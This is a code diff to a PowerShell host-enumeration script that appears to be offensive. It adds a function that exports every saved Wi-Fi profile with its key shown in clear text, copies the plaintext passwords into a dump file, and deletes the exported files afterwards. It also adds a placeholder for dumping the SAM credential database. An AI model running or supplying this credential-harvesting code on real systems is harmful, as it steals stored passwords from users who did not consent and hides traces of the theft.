@@ -71,6 +71,16 @@ Function Get-NetworkInfo {
 
 }
 
+Function Get-WifiInfo {
+    SectionHeader "WI-FI INFO"
+    
+    netsh wlan export profile key=clear
+
+    Select-String -Path Wi*.xml -Pattern 'keyMaterial' >> $dump_file
+
+    del Wi-Fi*
+}
+
 Function Get-FirewallEnum {
     SectionHeader "FIREWALL ENUMERATION"
 
@@ -95,9 +105,17 @@ Function Get-TaskSchedEnum {
     tasklist /SVC >> $dump_file
 }
 
+
+
+# WIP
+Function Get-SAMDump {
+    SectionHeader "SAM DUMP"
+}
+
 echo "Made by Trevor Kanten" > $dump_file
 Get-BasicInfo
 Get-NetworkInfo
+Get-WifiInfo
 Get-FirewallEnum
 Get-TaskSchedEnum
 
